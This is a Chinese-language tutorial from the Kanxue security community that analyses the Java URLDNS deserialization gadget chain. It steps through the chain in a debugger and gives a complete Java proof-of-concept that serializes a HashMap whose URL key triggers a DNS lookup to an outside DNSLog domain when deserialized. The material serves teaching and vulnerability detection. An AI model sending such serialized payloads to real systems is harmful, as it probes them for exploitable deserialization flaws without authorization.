---
title: URLDNS反序列化利用链
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458572382&idx=3&sn=358d10426f05a9dfc5e1f4b8cfb68ff8&chksm=b18de6d486fa6fc22c9e0a7deeefa7fcac0129a7d51b6f69d8cd9aef692c12e0360243e700a7&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-09-11
fetch_date: 2025-10-06T18:29:02.452646
---

# URLDNS反序列化利用链

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk6c2ARrXWsK4lzdEExBjRuNzY80icFgHS9kfxgfsn96gDlOa43qAicyDBQ/0?wx_fmt=jpeg)

# URLDNS反序列化利用链

米龙·0xFFFE

看雪学苑

```
一

漏洞复现
```

##

## 实验环境

◆DNSLog：http://ceye.io

◆Java序列化payload生成：https://github.com/0ofo/Deswing

◆JDK1.8

## 复现步骤

1. 先在DNSLog平台获得一个域名：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk66B9KOeaAhbONIC38Ybq3Snjxx6lZCgTkEAY7lFGgP2libXBw6BLeXYg/640?wx_fmt=other&from=appmsg)

2. 使用Deswing工具生成URLDNS的序列化文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk6DBEJzziaXNnE1fWPSIFnpoajPS1DvViceWVGTTjOCGibbEzQv5TSpftrg/640?wx_fmt=other&from=appmsg)

3. 编写一段反序列化代码：

```
public class DeserialDemo {
    public static void main(String[] args) throws Exception {
        Object o = deserialize("urldns.bin");    //传入上一步生成的序列化文件全路径
        System.out.println(o);
    }

    private static Object deserialize(String name) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(name));
        Object o = ois.readObject();
        return o;
    }
}
```

4. 执行后查看产生了DNSLog记录：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk6bW2T9n7B2DcwhQqIzzvWFtmiaBZawn70dOPXFVkZpgsPqdfibjoWTIfQ/640?wx_fmt=other&from=appmsg)

```
二

利用链分析
```

先来看反序列化后产生的是一个HashMap类型的对象，其中key为URL类型，value是一个String：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk6NJ3RenjzPb8LHa4svN8fOrYib6rjicU6KaIoqjWaPkwaOEicDYCHic1e6A/640?wx_fmt=other&from=appmsg)

在Java反序列化中，如果目标对象定义了readObject方法，则ObjectInputStream在调用readObject方法时，也会反射调用目标对象的readObject方法。

既然我们这里反序列化出的是一个HashMap对象，那我们找找HashMap是否定义了该方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk6bEXBVqHSEacxgKwqIdXCf1TvcgAteGzYEVibziaLBPCMRReFibdZNSqcQ/640?wx_fmt=webp&from=appmsg)

果然有，进入这个方法，将断点打到1397行：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk6iapO6a3CCyYBZ2usoMgAJ8ms2aA2kxvybNEVRKMxYEye1OdrKGgia8Dw/640?wx_fmt=other&from=appmsg)

这里调用了hash方法，跟进去：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk6qWdzhia5fHwtATahRibicteqz2lDPO9AaPic2xRzPAsb3kfk2ficQxACdXA/640?wx_fmt=other&from=appmsg)

继续调用key.hashCode()，跟进去：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk63oxhX2AdqHKzzs83iaXht3FTH97WzvbHEIZaVXI6ibGJes0FB08jR4xA/640?wx_fmt=other&from=appmsg)

前文提到HashMap对象的key是URL类型，所以这里是调用到了URL的hashCode方法，该方法的逻辑是：如果hashCode不等于-1，则直接返回，否则再调用handler的hashCode方法。点到hashCode的定义处可见其初始值为-1，所以这段逻辑也可理解为：如果hashCode是一个初始化值-1，则需要调用handler的hashCode方法为其赋值，如果不是-1，说明已经赋过值了，直接返回。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk6XgzHoricZaL2Facib9FpKpJBlqicJF4ibMhX5uRibf4jY322ecGrwGBryiag/640?wx_fmt=other&from=appmsg)

继续跟进到handler的hashCode方法里：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk6zTXcqXQCkicOPNRlhmZnwHDibaVjR5IPZQOI3ThQumWGAzIx53FWG8icg/640?wx_fmt=other&from=appmsg)

执行到这一行时，调用了getHostAddress方法，正是该函数触发了DNS请求。

可以使用Wireshark抓包DNS记录：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk6c7LvthibhXcMJq28WJqviawQPMicq3mYEVNn45axDoIkyEOZ7a15Jv18A/640?wx_fmt=other&from=appmsg)

很明显我的路由器缓存了域名解析记录，这里的DNS记录是由路由器返回的。

总结利用链：

```
// HashMap(key, value)
//         URL.hashCode() 初始值-1
//             URLStreamHandler.hashCode
```

```
二

POC编写
```

根据前文的分析，先构造一个HashMap对象，key为URL类型，value随意：

```
URL url = new URL("http://milon.xxx.ceye.io");
Map<URL, Object> map = new HashMap<>();
map.put(url, "hello");
```

通过反射获取URL对象的hashCode方法，将其设置为-1：

```
Field hashCodeField = url.getClass().getDeclaredField("hashCode");
hashCodeField.setAccessible(true);
hashCodeField.setInt(url, -1);
```

定义一个序列化方法并调用：

```
private static void serializable(Object o, String name) throws IOException {
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(name));
    oos.writeObject(o);
}
```

完整POC：

```
public class DeserialDemo {
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://milon.xxx.ceye.io");
        Map<URL, Object> map = new HashMap<>();
        map.put(url, "hello");

        Field hashCodeField = url.getClass().getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.setInt(url, -1);

        serializable(map, "urldns.bin");

        Object o = deserialize("urldns.bin");
        System.out.println(o);
    }

    private static Object deserialize(String name) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(name));
        Object o = ois.readObject();
        return o;
    }

    private static void serializable(Object o, String name) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(name));
        oos.writeObject(o);
    }
}
```

注意：通过反射设置hashCode为-1，一定要放在map.put调用之后，因为map.put方法也会触发key的hashCode方法，如果先设为-1再调用map.put就会覆写hashCode的值，导致序列化写入的对象hashCode不是-1，那么反序列化时将无法触发DNS查询。

# 参考

【Java安全-基础】URLDNS反序列化利用链（https://www.bilibili.com/video/BV18p421X7x1/?spm\_id\_from=333.788&vd\_source=a159c09e030a5761dc535692a374307c）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FxlZ26xESNna7hH3DfMSk6o3VqHIsDXr81Qq3O3wR9rfNwdGLRbANmDXsyiblXvHuslVeC1OEMV7A/640?wx_fmt=png&from=appmsg)

**看雪ID：米龙·0xFFFE**

*https://bbs.kanxue.com/user-home-997719.htm*

\*本文为看雪论坛优秀文章，由 米龙·0xFFFE 原创，转载请注明来自看雪社区

[![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GRSx16NymEZASvWUkD0o0xciaOHemlKTGuEic3iazgrRg1njFXg0Ey0Ap6bl8iafGbZD1hLJYZEZAj7w/640?wx_fmt=png&from=appmsg)](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458565463&idx=1&sn=e03e9773326308fa63d18676470a6824&scene=21#wechat_redirect)

**# 往期推荐**

1、[Alt-Tab Terminator注册算法逆向](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458563181&idx=1&sn=1dd42dbb95362d9678431b94473ab1f4&chksm=b18d82e786fa0bf1681d92f0d13b064eeae9530e5b2e86f78fd7f4d2662bfaffe5e99993d08f&scene=21#wechat_redirect)

2、[恶意木马历险记](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458562562&idx=2&sn=1d66bb3141b820c717f86d349660e9ec&chksm=b18d808886fa099efc353521af0839c9bf5fbd4cae2985cf3a9a6ea28fa617f8300c0ab115a7&scene=21#wechat_redirect)

3、[VMP源码分析：反调试与绕过方法](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458562488&idx=2&sn=fe5bd1498948137775db5f454bd5a6a2&chksm=b18d9f3286fa162491072b9cd141784c1a60b2b00fd8203f865c51ef753e3f45573a78810949&scene=21#wechat_redirect)

4、[Chrome V8 issue 1486342浅析](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458562487&idx=2&sn=b2d6ad2776d37f416933e1439f244430&chksm=b18d9f3d86fa162b5edfd1c8e616c9ea5460cf21afc5d41cfd8122fbc73830c61f125c8a4960&scene=21#wechat_redirect)

5、[Cython逆向-语言特性分析](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458562186&idx=1&sn=bd95ad7951c93578ed5f0cbb1971332c&chksm=b18d9e0086fa1716382e78c54135a0a296fa215688b9a741576d41897729625284287e598faf&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GDgjicLBjGjBq63Hnp7DmRNT86hyuq6QGl2Zh7b0IwRicAPgb3r1abUEe46MhrwYD1GqcX76t31fKA/640?wx_fmt=gif&from=appmsg)

**球分享**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GDgjicLBjGjBq63Hnp7DmRNT86hyuq6QGl2Zh7b0IwRicAPgb3r1abUEe46MhrwYD1GqcX76t31fKA/640?wx_fmt=gif&from=appmsg)

**球点赞**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GDgjicLBjGjBq63Hnp7DmRNT86hyuq6QGl2Zh7b0IwRicAPgb3r1abUEe46MhrwYD1GqcX76t31fKA/640?wx_fmt=gif&from=appmsg)

**球在看**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8GDgjicLBjGjBq63Hnp7DmRNp5aaC28Vzoibu2eYfSuD9d4nTJceKXwuR8oBEzcjMUPCLUMMgdAzQBA/640?wx_fmt=gif&from=appmsg)

点击阅读原文查看更多

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EGLfh77kFmnicd9WOic2ibvhCibFdB4bL4srJCgo2wnvdoXLxpIvAkfCmmcptXZB0qKWMoIP8iaibYN2FA/0?wx_fmt=png)

看雪学苑

向上滑动看下一个

知道了

![]()
...